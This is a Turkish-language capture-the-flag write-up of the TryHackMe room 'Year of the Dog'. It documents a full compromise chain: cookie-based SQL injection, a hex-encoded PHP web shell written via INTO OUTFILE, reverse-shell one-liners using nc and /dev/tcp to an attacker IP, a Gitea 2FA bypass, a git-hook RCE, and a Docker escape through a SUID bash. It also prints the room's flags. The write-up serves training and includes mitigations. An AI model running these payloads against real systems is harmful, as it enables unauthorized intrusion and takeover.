# 🐕 Year of the Dog — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Zor-kırmızı)
![Kategori](https://img.shields.io/badge/Kategori-Web%20|%20SQLi%20|%20Gitea%20|%20Docker%20Escape-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Mayıs 2026  
> **Oda:** [Year of the Dog](https://tryhackme.com/room/yearofthedog)

---

## 📋 Yönetici Özeti

Bu write-up, **Year of the Dog** makinesinin tam sömürülmesini belgelemektedir. Cookie tabanlı SQL injection ile başlayan, `INTO OUTFILE` ile shell upload'a, SSH tunneling ve Gitea 2FA bypass ile devam eden, git hook RCE ile Docker konteynerine giriş ve paylaşılan volume üzerinden host root'una escape ile sonuçlanan çok aşamalı bir saldırı zincirini göstermektedir.

---

## 🛠️ Kullanılan Araçlar ve Teknolojiler

| Araç | Amaç |
|------|------|
| `nmap` | Ağ keşfi |
| `gobuster` | Dizin enumerasyonu |
| `curl` | SQLi exploit ve shell upload |
| `nc` | Ters kabuk dinleyicisi |
| `ssh` | Port forwarding (Gitea erişimi) |
| `Burp Suite` | 2FA bypass ve HTTP manipülasyonu |
| `git` | Gitea hook exploit'i |

---

## 🔍 Aşama 1: Keşif ve Enumerasyon

### Ağ Taraması

```bash
nmap -sV -sC -T4 <HEDEF_IP>
```

### Bulgular

| Port | Durum | Servis | Versiyon |
|------|-------|--------|----------|
| 22/tcp | açık | SSH | OpenSSH |
| 80/tcp | açık | HTTP | Apache httpd |

### Dizin Enumerasyonu

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Keşfedilen Dizinler:**
- `/index.php` — Canis Queue sayfası
- `/assets` — Statik dosyalar

**Kritik Gözlem:** Cookie'de `id=` parametresi mevcut — SQL injection potansiyeli.

---

## 🌐 Aşama 2: SQL Injection → RCE

### Cookie SQLi Doğrulama

```bash
curl -H "Cookie: id=6e210d5176a702468d265a1ab79cde81'" http://<HEDEF_IP>/
```

**Sonuç:** SQL hatası — injection doğrulandı.

### WAF Atlatma (Hex Encoding)

`<` ve `>` karakterleri WAF tarafından engelleniyor. Hex encoding ile atlatma:

```bash
# PHP payload'ı hex'e çevir
mysql> select hex('<?php system($_GET["cmd"]) ?>');
# 3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E
```

### INTO OUTFILE ile Shell Upload

```bash
curl -H "Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,unhex('3C3F706870...') INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -" http://<HEDEF_IP>/
```

### Shell Doğrulama

```bash
curl http://<HEDEF_IP>/shell.php?cmd=id
# uid=33(www-data)
```

### Ters Kabuk

**Dinleyici:**
```bash
nc -lvnp 9000
```

**Payload:**
```bash
curl -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <SALDIRGAN_IP> 9000 >/tmp/f' http://<HEDEF_IP>/shell.php
```

**Sonuç:** `www-data` olarak etkileşimli kabuk elde edildi.

---

## 🚀 Aşama 3: Dylan Kullanıcısına Yükseltme

### Log Analizi

```bash
grep -Ri dylan /home/dylan/work_analysis
```

**Bulgu:**
```
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLa**********f3 from 192.168.1.142
```

**Analiz:** Kullanıcı adı yerine parola yazılmış — format: `dylan` + `La**********f3`

### SSH Girişi

```bash
su dylan
# Password: La**********f3
```

### Kullanıcı Flag'i

```bash
cat /home/dylan/user.txt
```

**Kullanıcı Flag'i:** `THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}`

---

## 🔄 Aşama 4: Gitea Erişimi ve 2FA Bypass

### Yerel Servis Keşfi

```bash
netstat -tulpn
```

**Bulgu:** Gitea `127.0.0.1:3000`'de çalışıyor.

### SSH Port Forwarding

```bash
ssh -N -L 3000:127.0.0.1:3000 dylan@<HEDEF_IP>
```

### Gitea Kimlik Doğrulama

- **Username:** `dylan`
- **Password:** `La**********f3`
- **2FA:** Aktif — basic auth ile atlatma

### 2FA Bypass (Basic Auth)

```bash
curl --request GET --url http://dylan:La**********f3@localhost:3000/
```

**Burp Suite:** `Authorization: Basic` header'ı her isteğe eklendi.

---

## 🐳 Aşama 5: Gitea Git Hook → Docker Kabuğu

### Zafiyet

Gitea 1.13.0'da git hook RCE zafiyeti (FSA-2020-3).

### Pre-receive Hook

```bash
#!/bin/bash
bash -i >& /dev/tcp/<SALDIRGAN_IP>/9001 0>&1
```

### Push ve Kabuk

```bash
nc -lvnp 9001
```

**Sonuç:** `uid=1000(git)` kabuğu elde edildi.

### Docker Tespiti

```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
```

**Doğrulandı:** Docker konteyneri içindeyiz.

```bash
sudo -l
# (ALL) NOPASSWD: ALL
```

---

## 🏁 Aşama 6: Docker Escape → Host Root

### Paylaşılan Volume Analizi

`/gitea` dizini host ve konteyner arasında paylaşılıyor.

### SUID Bash Oluşturma

```bash
# Konteyner içinde (root olarak)
cd /data/gitea
cp /bin/bash .
chown root:root bash
chmod 4755 bash
```

### Host'ta Çalıştırma

```bash
cd /gitea/gitea
./bash -p
# euid=0(root)
```

### Root Flag'i

```bash
cat /root/root.txt
```

**Root Flag'i:** `THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}`

---

## 🗺️ Saldırı Yolu Görselleştirmesi

```
[Saldırgan]
    │
    ├───nmap───► [Hedef: 22, 80]
    │                │
    │                ▼
    │        [Cookie'de id= parametresi]
    │                │
    │                ▼
    │        [SQLi doğrulama (hex atlatma)]
    │                │
    │                ▼
    │        [INTO OUTFILE shell upload]
    │                │
    │                ▼
    │        [www-data kabuğu]
    │                │
    │                ▼
    │        [work_analysis log'undan parola]
    │                │
    │                ▼
    │        [Dylan kullanıcısı]
    │                │
    │                ▼
    │        [Kullanıcı Flag'i]
    │                │
    │                ▼
    │        [SSH tunnel :3000]
    │                │
    │                ▼
    │        [Gitea 2FA bypass (Basic Auth)]
    │                │
    │                ▼
    │        [Git hook RCE]
    │                │
    │                ▼
    │        [Docker konteyneri (git user)]
    │                │
    │                ▼
    │        [Paylaşılan volume: /gitea]
    │                │
    │                ▼
    │        [SUID bash oluştur]
    │                │
    │                ▼
    └────────► [Host root + Root Flag'i]
```

---

## 🛡️ Zafiyet Değerlendirmesi ve Çözümler

| # | Zafiyet | Şiddet | CVSS | Çözüm |
|---|---------|--------|------|-------|
| 1 | **Cookie Tabanlı SQLi** | 🔴 Kritik | 9.8 | Parametrik sorgular; girdi doğrulama; WAF kuralları güncelle |
| 2 | **INTO OUTFILE Shell Upload** | 🔴 Kritik | 9.0 | `secure_file_priv` kısıtlaması; dosya izinleri; web kökü dışına yazma |
| 3 | **SSH Log'da Parola Sızdırma** | 🔴 Kritik | 9.0 | Log rotasyonu; hassas veri filtreleme; merkezi log yönetimi |
| 4 | **Gitea 2FA Bypass** | 🔴 Kritik | 9.0 | Basic Auth'u devre dışı bırak; session tabanlı 2FA zorla |
| 5 | **Git Hook RCE** | 🔴 Kritik | 9.8 | Gitea güncelle; hook yürütmesini kısıtla; sandbox |
| 6 | **Docker Volume Paylaşımı** | 🟠 Yüksek | 7.5 | Read-only mount; SELinux/AppArmor; kullanıcı namespace |

---

## 🎓 Temel Çıkarımlar

1. **Cookie SQLi:** Gizli parametrelerde bile injection test et — `id=` cookie'de görünmez
2. **Hex Encoding:** WAF atlatma için temel teknik — `<>` yerine hex kullan
3. **Log Parola Arama:** `/var/log`, `work_analysis` gibi dizinlerde kimlik bilgileri saklanır
4. **2FA Bypass:** Basic Auth, 2FA'yı atlatmanın klasik yoludur
5. **Docker Volume:** Paylaşılan dizinler escape vektörüdür — SUID binary ile exploit edilir
6. **Git Hook RCE:** Gitea/GitLab hook'ları sıklıkla gözden kaçan RCE yüzeyleridir

---

---

## 🚩 Flag'ler

| Flag | Konum | Değer |
|------|-------|-------|
| **Kullanıcı Flag'i** | `/home/dylan/user.txt` | `THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}` |
| **Root Flag'i** | `/root/root.txt` | `THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}` |

---

> **⚠️ Yasal Uyarı:** Bu write-up sadece eğitim ve araştırma amaçlıdır. Sahibi olmadığınız sistemleri test etmeden önce her zaman açık yazılı yetki alın.

---

**Yazar:** Miraç Akkuş (LatenT)  
**Tarih:** Mayıs 2026
